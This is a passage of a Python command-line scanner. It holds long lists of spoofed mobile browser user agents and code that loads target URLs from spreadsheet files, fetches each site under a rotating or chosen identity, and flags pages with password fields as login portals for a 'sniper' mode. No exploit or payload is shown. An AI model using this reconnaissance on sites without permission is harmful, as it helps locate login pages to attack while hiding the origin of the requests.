        'Mozilla/5.0 (Linux; Android 13; SM-S911U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-S938U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S906U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G981U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 8; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-S921U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-S936U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S721U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
    ],
    'moto_razr': [
        'Mozilla/5.0 (Linux; Android 14; motorola razr 50 ultra Build/U3UX34.56-29-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40 ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; motorola razr 2022) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr+ 2024) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; motorola razr 50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; motorola razr 5G 2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; motorola razr 2022 ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr 50 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; motorola razr ultra 2025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; motorola edge razr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr 50 ultra 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40 ultra 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; motorola razr 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; motorola razr 50 fold) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr+ ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; motorola razr 2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40 fold) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; motorola razr 50 ultra pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr 50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; motorola razr 40+) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; motorola razr 2022 pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; motorola razr ultra 2025 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; motorola razr 50 neo) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
    ],
    'samsung_misc': [
        'Mozilla/5.0 (Linux; Android 14; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-F900U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-X900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-F711B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-N978B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-F956B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-X200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-F916U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-N980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-F946B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-X205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-N986U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-N978U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-F916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-X910) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-N971U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; SM-X200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 15; SM-F946U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; SM-N980U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
    ],
    'iphone_legacy': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/600.1.4',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/600.1.4',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A280g Safari/600.1.4',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A342 Safari/601.1.46',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1.46',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D20 Safari/601.1.46',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E233 Safari/601.1.46',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A234 Safari/602.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14B100 Safari/602.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15B93 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E216 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15F79 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16A5308e Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16C101 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16E227 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16F86 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16G140 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16G140 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16H22 Safari/605.1.15'
    ],
    'iphone_common': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/16G140 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17A577 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17A585 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17B102 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17C54 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17E184 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17F60 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17G71 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/17H35 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18A373 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18B92 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18B111 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18D52 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18E5193d Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18E5194d Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18E5195d Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18F72 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18G69 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18H17 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18H109 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/18H129 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19B5001f Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19C5026b Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19D5026i Safari/604.1'
    ],
    'iphone_current': [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19E241 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19F77 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19G82 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19H365 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19H376 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20A381 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20B5050f Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20D47 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20D91 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20E248 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20F253 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20G75 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/20H276 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21A329 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21B75 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21C52 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21D62 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21E239 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21F79 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/21G103 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/22A250 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/22B105 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/22C142 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/22D46 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/22E248 Safari/604.1'
    ]
}

ALL_USER_AGENTS = []
for category in USER_AGENTS:
    ALL_USER_AGENTS.extend(USER_AGENTS[category])

# Grouped for Sniper Mode
UA_GROUPS = {
    'Windows': USER_AGENTS['windows'],
    'MacOS': USER_AGENTS['mac'],
    'Android': USER_AGENTS['android'] + USER_AGENTS['motorola_5g'] + USER_AGENTS['samsung_a'] + USER_AGENTS['samsung_s'] + USER_AGENTS['moto_razr'] + USER_AGENTS['samsung_misc'],
    'iPhone': USER_AGENTS['iphone'] + USER_AGENTS['iphone_legacy'] + USER_AGENTS['iphone_common'] + USER_AGENTS['iphone_current']
}

# Standard Headers for initial requests
HEADERS = {
    'User-Agent': random.choice(ALL_USER_AGENTS),
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
}

# --- UI Functions ---
def print_banner(text):
    """Uses toilet and lolcat for a fancy banner."""
    try:
        p1 = subprocess.Popen(["toilet", "-f", "big", text], stdout=subprocess.PIPE)
        p2 = subprocess.Popen(["lolcat"], stdin=p1.stdout)
        p1.stdout.close()
        p2.communicate()
    except FileNotFoundError:
        console.print(Panel(f"[bold cyan]{text}[/bold cyan]"))

def clear_screen():
    os.system('clear')

# --- File Operations ---
def find_database_files(root_dir):
    matches = []
    for root, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            if filename.lower().endswith(('.csv', '.xlsx')):
                matches.append(os.path.join(root, filename))
    return matches

def load_file(filepath):
    try:
        if filepath.lower().endswith('.csv'):
            return pd.read_csv(filepath)
        elif filepath.lower().endswith('.xlsx'):
            return pd.read_excel(filepath)
    except Exception as e:
        console.print(f"[bold red]Error loading file:[/bold red] {e}")
        return None

# --- Advanced Analysis Functions ---
def analyze_target(url, user_agent=None, timeout=8):
    """
    Initial Deep Inspection with optional fixed UA.
    """
    if not isinstance(url, str) or not url.strip():
        return "Missing URL", "N/A", False, "No Data"
    
    # Ensure protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        # Use fixed UA or random
        headers = HEADERS.copy()
        if user_agent:
            headers['User-Agent'] = user_agent
        else:
            headers['User-Agent'] = random.choice(ALL_USER_AGENTS)
        
        response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
        final_url = response.url
        code = response.status_code
        
        if code >= 400:
            return f"Error {code}", final_url, False, "Unreachable"

        # Content Analysis using BeautifulSoup
        soup = BeautifulSoup(response.content, 'lxml')
        
        # Get Title
        page_title = soup.title.string.strip() if soup.title and soup.title.string else "No Title"
        if len(page_title) > 30:
            page_title = page_title[:27] + "..."

        # Detect Login Form
        has_login_form = bool(soup.find('input', {'type': 'password'}))
        
        status_label = "Active"
        if has_login_form:
            status_label = "Login Portal"
        
        return status_label, final_url, has_login_form, page_title

    except requests.exceptions.SSLError:
        return "SSL Error", url, False, "Cert Fail"
    except requests.exceptions.ConnectionError:
        return "Connection Failed", url, False, "Down"
    except requests.exceptions.Timeout:
        return "Timed Out", url, False, "Slow"
    except Exception as e:
        return "Error", url, False, str(e)[:10]

def select_sniper_entry(df):
    """Select a single entry from the dataframe."""
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("#", style="dim", width=4)
    table.add_column("Name", style="cyan")
    table.add_column("URL", style="dim white")

    for idx, (_, row) in enumerate(df.iterrows()):
        table.add_row(str(idx + 1), str(row.get('name', 'Unknown')), str(row.get('url', '')))

    console.print(table)
    
    try:
        selection = IntPrompt.ask("\n[bold green]Select entry # to snipe: [/bold green]")
        if 1 <= selection <= len(df):
            return df.iloc[selection - 1]
        else:
            console.print("[red]Invalid selection. Returning to menu.[/red]")
            return None
    except ValueError:
        console.print("[red]Please enter a number.[/red]")
        return None

def select_sniper_ua():
    """Select a UA from groups."""
    groups = list(UA_GROUPS.keys())
    group_choice = Prompt.ask("\n[bold green]Select group (Windows/MacOS/Android/iPhone): [/bold green]", choices=groups)
    group_uas = UA_GROUPS[group_choice]
    
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("#", style="dim", width=4)
    table.add_column("User Agent (truncated)", style="cyan")

